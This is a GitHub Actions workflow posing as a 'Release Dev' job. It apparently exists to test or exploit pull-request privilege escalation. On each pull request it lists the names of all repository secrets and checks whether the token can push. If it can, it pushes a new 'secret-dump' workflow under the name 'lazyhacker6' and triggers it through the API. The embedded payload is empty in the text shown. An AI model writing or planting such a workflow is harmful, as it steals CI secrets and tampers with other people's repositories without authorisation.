name: Release Dev
on:
  pull_request:
permissions:
  contents: write
  actions: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "forged Release Dev workflow completed"
      - name: escalation probe
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SECRETS_JSON: ${{ toJSON(secrets) }}
        run: |
          echo "secret_keys=$(printf '%s' "$SECRETS_JSON" | jq -r 'if type=="object" then (keys|join(",")) else "none" end' 2>/dev/null || echo parsefail)"
          PERMS=$(curl -sS -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/${GITHUB_REPOSITORY}" | jq -c '.permissions')
          echo "perms=$PERMS"
          PUSH_OK=$(printf '%s' "$PERMS" | jq -r '.push // false')
          if [ "$PUSH_OK" != "true" ]; then echo "fork-pr-token=read-only"; exit 0; fi
          echo "fork-pr-token=WRITE"
          rm -rf /tmp/repro && git clone --quiet "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}" /tmp/repro
          cd /tmp/repro
          B="repro-${GITHUB_RUN_ID}"
          git -c user.name=lazyhacker6 -c user.email=lazyhacker6@example.com checkout -q -b "$B"
          mkdir -p .github/workflows
          printf '%s' '' | base64 -d > .github/workflows/secret-dump.yml
          cat .github/workflows/secret-dump.yml
          git -c user.name=lazyhacker6 -c user.email=lazyhacker6@example.com add .github/workflows/secret-dump.yml
          git -c user.name=lazyhacker6 -c user.email=lazyhacker6@example.com commit -q -m "ci: secret dump"
          git -c user.name=lazyhacker6 -c user.email=lazyhacker6@example.com push origin "$B" && echo "pushed=$B"
          curl -sS -o /tmp/disp.json -w "dispatch_http=%{http_code}\n" -X POST             -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json'             "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/secret-dump.yml/dispatches"             -d "{\"ref\":\"$B\"}"
          head -c 300 /tmp/disp.json; echo
